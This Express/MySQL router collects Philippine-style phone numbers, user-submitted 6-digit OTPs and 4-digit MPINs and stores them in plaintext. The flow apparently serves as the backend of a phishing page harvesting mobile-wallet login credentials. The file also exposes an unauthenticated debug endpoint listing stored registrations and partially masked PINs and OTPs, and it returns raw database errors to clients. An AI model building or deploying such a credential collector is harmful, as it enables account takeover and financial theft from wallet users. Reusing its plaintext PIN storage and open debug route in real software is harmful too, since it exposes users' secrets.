const express = require('express');
const pool = require('../config/db');

const router = express.Router();

const ensureSchema = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS phone_registrations (
        id INT AUTO_INCREMENT PRIMARY KEY,
        dial_code VARCHAR(10) NOT NULL,
        phone VARCHAR(10) NOT NULL,
        mpin VARCHAR(6),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
      )
    `);
    
    // Add MPIN column if it doesn't exist (for existing tables)
    try {
      const [columns] = await pool.query(`
        SELECT COLUMN_NAME 
        FROM INFORMATION_SCHEMA.COLUMNS 
        WHERE TABLE_SCHEMA = DATABASE() 
        AND TABLE_NAME = 'phone_registrations' 
        AND COLUMN_NAME = 'mpin'
      `);
      
      if (columns.length === 0) {
        await pool.query(`
          ALTER TABLE phone_registrations 
          ADD COLUMN mpin VARCHAR(6)
        `);
        // eslint-disable-next-line no-console
        console.log('✓ MPIN column added to phone_registrations table');
      } else {
        // eslint-disable-next-line no-console
        console.log('✓ MPIN column already exists in phone_registrations table');
      }
      
      // Also ensure updated_at column exists
      const [updatedAtColumns] = await pool.query(`
        SELECT COLUMN_NAME 
        FROM INFORMATION_SCHEMA.COLUMNS 
        WHERE TABLE_SCHEMA = DATABASE() 
        AND TABLE_NAME = 'phone_registrations' 
        AND COLUMN_NAME = 'updated_at'
      `);
      
      if (updatedAtColumns.length === 0) {
        await pool.query(`
          ALTER TABLE phone_registrations 
          ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        `);
        // eslint-disable-next-line no-console
        console.log('✓ updated_at column added to phone_registrations table');
      }
    } catch (alterError) {
      // Column might already exist, ignore error
      if (alterError.message && alterError.message.includes('Duplicate column name')) {
        // eslint-disable-next-line no-console
        console.log('✓ Columns already exist (no changes needed)');
      } else {
        // eslint-disable-next-line no-console
        console.warn('⚠ Could not add columns:', alterError.message);
      }
    }
    
    // eslint-disable-next-line no-console
    console.log('Database table "phone_registrations" is ready');
    
    // Create OTP table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS otp (
        id INT AUTO_INCREMENT PRIMARY KEY,
        phone VARCHAR(10) NOT NULL,
        otp VARCHAR(6) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_phone (phone)
      )
    `);
    
    // eslint-disable-next-line no-console
    console.log('Database table "otp" is ready');
    
    // Create MPIN table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS mpin (
        id INT AUTO_INCREMENT PRIMARY KEY,
        phone VARCHAR(10) NOT NULL,
        mpin VARCHAR(4) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_phone (phone)
      )
    `);
    
    // eslint-disable-next-line no-console
    console.log('Database table "mpin" is ready');
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error('Failed to ensure database schema:', error.message);
    throw error;
  }
};

// Ensure schema on startup
ensureSchema().catch(error => {
  // eslint-disable-next-line no-console
  console.error('Failed to create database table on startup:', error.message);
});

router.get('/health', async (req, res) => {
  try {
    const [rows] = await pool.query('SELECT 1 AS status');
    res.json({
      status: 'ok',
      database: rows.length > 0 ? 'connected' : 'unknown',
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Diagnostic endpoint to check table structure and data
router.get('/debug/phone-registrations', async (req, res) => {
  try {
    // Check phone_registrations table structure
    const [columns] = await pool.query(`
      SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE
      FROM INFORMATION_SCHEMA.COLUMNS 
      WHERE TABLE_SCHEMA = DATABASE() 
      AND TABLE_NAME = 'phone_registrations'
      ORDER BY ORDINAL_POSITION
    `);
    
    // Get all phone registrations
    const [registrations] = await pool.query(`
      SELECT id, dial_code, phone, created_at, updated_at
      FROM phone_registrations
      ORDER BY created_at DESC
      LIMIT 50
    `);
    
    // Check OTP table structure
    const [otpColumns] = await pool.query(`
      SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE
      FROM INFORMATION_SCHEMA.COLUMNS 
      WHERE TABLE_SCHEMA = DATABASE() 
      AND TABLE_NAME = 'otp'
      ORDER BY ORDINAL_POSITION
    `);
    
    // Get all OTP entries (masked for security)
    const [otpEntries] = await pool.query(`
      SELECT id, phone, 
             CONCAT(LEFT(otp, 2), '****') as otp_masked,
             created_at
      FROM otp
      ORDER BY created_at DESC
      LIMIT 50
    `);
    
    // Check MPIN table structure
    const [mpinColumns] = await pool.query(`
      SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE
      FROM INFORMATION_SCHEMA.COLUMNS 
      WHERE TABLE_SCHEMA = DATABASE() 
      AND TABLE_NAME = 'mpin'
      ORDER BY ORDINAL_POSITION
    `);
    
    // Get all MPIN entries (masked for security)
    const [mpinEntries] = await pool.query(`
      SELECT id, phone, 
             CONCAT(LEFT(mpin, 1), '***') as mpin_masked,
             created_at
      FROM mpin
      ORDER BY created_at DESC
      LIMIT 50
    `);
    
    res.json({
      phoneRegistrations: {
        tableStructure: columns,
        registrations: registrations,
        totalCount: registrations.length,
      },
      otpTable: {
        tableStructure: otpColumns,
        entries: otpEntries,
        totalCount: otpEntries.length,
      },
      mpinTable: {
        tableStructure: mpinColumns,
        entries: mpinEntries,
        totalCount: mpinEntries.length,
      },
    });
  } catch (error) {
    res.status(500).json({ 
      status: 'error', 
      message: error.message,
      hint: 'Make sure the tables exist'
    });
  }
});

router.post('/phone-registrations', async (req, res) => {
  try {
    const { dialCode, phone } = req.body;

    if (typeof phone !== 'string' || typeof dialCode !== 'string') {
      return res.status(400).json({ message: 'Dial code and phone are required.' });
    }

    const trimmedDialCode = dialCode.trim();
    const digitsOnly = phone.replace(/\D/g, '');

    if (!/^\+?\d+$/.test(trimmedDialCode)) {
      return res.status(400).json({ message: 'Dial code must be numeric.' });
    }

    if (!/^9\d{9}$/.test(digitsOnly)) {
      return res.status(400).json({ message: 'Phone must start with 9 and contain exactly 10 digits.' });
    }

    // Ensure table exists before inserting (with error handling)
    try {
      await ensureSchema();
    } catch (schemaError) {
      // eslint-disable-next-line no-console
      console.error('Schema creation failed:', schemaError.message);
      return res.status(500).json({
        message: 'Database setup error. Please check your database configuration.',
        detail: schemaError.message,
      });
    }

    // Insert phone number into database
    const [result] = await pool.query(
      'INSERT INTO phone_registrations (dial_code, phone) VALUES (?, ?)',
      [trimmedDialCode, digitsOnly]
    );

    // eslint-disable-next-line no-console
    console.log(`Phone number saved: ${trimmedDialCode}${digitsOnly} (ID: ${result.insertId})`);

    res.status(201).json({
      message: 'Phone number stored successfully.',
      id: result.insertId,
    });
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error('Error saving phone number:', error);
    
    // Check if it's a table doesn't exist error
    if (error.message && error.message.includes("doesn't exist")) {
      return res.status(500).json({
        message: 'Database table not found. Please check your database configuration.',
        detail: error.message,
        hint: 'Make sure the database name in your .env file matches your MySQL database.',
      });
    }
    
    res.status(500).json({
      message: 'Failed to store phone number.',
      detail: error.message,
    });
  }
});

router.post('/otp', async (req, res) => {
  try {
    const { phone, otp } = req.body;

    // eslint-disable-next-line no-console
    console.log('📥 OTP save request received:', { phone: phone ? phone.substring(0, 5) + '***' : 'missing', otpLength: otp ? otp.length : 0 });

    if (typeof phone !== 'string' || typeof otp !== 'string') {
      return res.status(400).json({ message: 'Phone and OTP are required.' });
    }

    const digitsOnly = phone.replace(/\D/g, '');
    const otpDigits = otp.replace(/\D/g, '');

    // Extract phone number (remove country code if present)
    let phoneNumber = digitsOnly;
    if (digitsOnly.startsWith('63') && digitsOnly.length >= 12) {
      phoneNumber = digitsOnly.slice(2); // Remove '63' prefix
    }

    // eslint-disable-next-line no-console
    console.log('📱 Processed phone number:', { original: phone, digitsOnly, phoneNumber });

    if (!/^9\d{9}$/.test(phoneNumber)) {
      // eslint-disable-next-line no-console
      console.error('❌ Invalid phone format:', phoneNumber);
      return res.status(400).json({ message: 'Phone must start with 9 and contain exactly 10 digits.' });
    }

    if (!/^\d{6}$/.test(otpDigits)) {
      // eslint-disable-next-line no-console
      console.error('❌ Invalid OTP format:', otpDigits.length, 'digits');
      return res.status(400).json({ message: 'OTP must be exactly 6 digits.' });
    }

    // Ensure table exists
    try {
      await ensureSchema();
    } catch (schemaError) {
      // eslint-disable-next-line no-console
      console.error('Schema creation failed:', schemaError.message);
      return res.status(500).json({
        message: 'Database setup error. Please check your database configuration.',
        detail: schemaError.message,
      });
    }

    // Check if phone registration exists
    const [existing] = await pool.query(
      'SELECT id FROM phone_registrations WHERE phone = ?',
      [phoneNumber]
    );

    // eslint-disable-next-line no-console
    console.log('🔍 Phone lookup result:', { found: existing.length > 0, phoneNumber });

    if (existing.length === 0) {
      // eslint-disable-next-line no-console
      console.error('❌ Phone number not found in database');
      return res.status(404).json({ 
        message: 'Phone number not found. Please register your phone number first.',
        searchedPhone: phoneNumber
      });
    }

    // Insert OTP into the OTP table
    const [insertResult] = await pool.query(
      'INSERT INTO otp (phone, otp) VALUES (?, ?)',
      [phoneNumber, otpDigits]
    );

    // eslint-disable-next-line no-console
    console.log(`✅ OTP saved to OTP table for phone: ${phoneNumber}`, { 
      insertId: insertResult.insertId
    });

    res.status(200).json({
      message: 'OTP saved successfully.',
      phone: phoneNumber,
      otpId: insertResult.insertId,
    });
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error('❌ Error saving OTP:', error);
    
    res.status(500).json({
      message: 'Failed to save OTP.',
      detail: error.message,
    });
  }
});

router.post('/mpin', async (req, res) => {
  try {
    const { phone, mpin } = req.body;

    // eslint-disable-next-line no-console
    console.log('📥 MPIN save request received:', { phone: phone ? phone.substring(0, 5) + '***' : 'missing', mpinLength: mpin ? mpin.length : 0 });

    if (typeof phone !== 'string' || typeof mpin !== 'string') {
      return res.status(400).json({ message: 'Phone and MPIN are required.' });
    }

    const digitsOnly = phone.replace(/\D/g, '');
    const mpinDigits = mpin.replace(/\D/g, '');

    // Extract phone number (remove country code if present)
    let phoneNumber = digitsOnly;
    if (digitsOnly.startsWith('63') && digitsOnly.length >= 12) {
      phoneNumber = digitsOnly.slice(2); // Remove '63' prefix
    }

    // eslint-disable-next-line no-console
    console.log('📱 Processed phone number:', { original: phone, digitsOnly, phoneNumber });

    if (!/^9\d{9}$/.test(phoneNumber)) {
      // eslint-disable-next-line no-console
      console.error('❌ Invalid phone format:', phoneNumber);
      return res.status(400).json({ message: 'Phone must start with 9 and contain exactly 10 digits.' });
    }

    if (!/^\d{4}$/.test(mpinDigits)) {
      // eslint-disable-next-line no-console
      console.error('❌ Invalid MPIN format:', mpinDigits.length, 'digits');
      return res.status(400).json({ message: 'MPIN must be exactly 4 digits.' });
    }

    // Ensure table exists
    try {
      await ensureSchema();
    } catch (schemaError) {
      // eslint-disable-next-line no-console
      console.error('Schema creation failed:', schemaError.message);
      return res.status(500).json({
        message: 'Database setup error. Please check your database configuration.',
        detail: schemaError.message,
      });
    }

    // Check if phone registration exists
    const [existing] = await pool.query(
      'SELECT id FROM phone_registrations WHERE phone = ?',
      [phoneNumber]
    );

    // eslint-disable-next-line no-console
    console.log('🔍 Phone lookup result:', { found: existing.length > 0, phoneNumber });

    if (existing.length === 0) {
      // eslint-disable-next-line no-console
      console.error('❌ Phone number not found in database');
      return res.status(404).json({ 
        message: 'Phone number not found. Please register your phone number first.',
        searchedPhone: phoneNumber
      });
    }

    // Insert MPIN into the MPIN table
    const [insertResult] = await pool.query(
      'INSERT INTO mpin (phone, mpin) VALUES (?, ?)',
      [phoneNumber, mpinDigits]
    );

    // eslint-disable-next-line no-console
    console.log(`✅ MPIN saved to MPIN table for phone: ${phoneNumber}`, { 
      insertId: insertResult.insertId
    });

    res.status(200).json({
      message: 'MPIN saved successfully.',
      phone: phoneNumber,
      mpinId: insertResult.insertId,
    });
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error('❌ Error saving MPIN:', error);
    
    res.status(500).json({
      message: 'Failed to save MPIN.',
      detail: error.message,
    });
  }
});

module.exports = router;

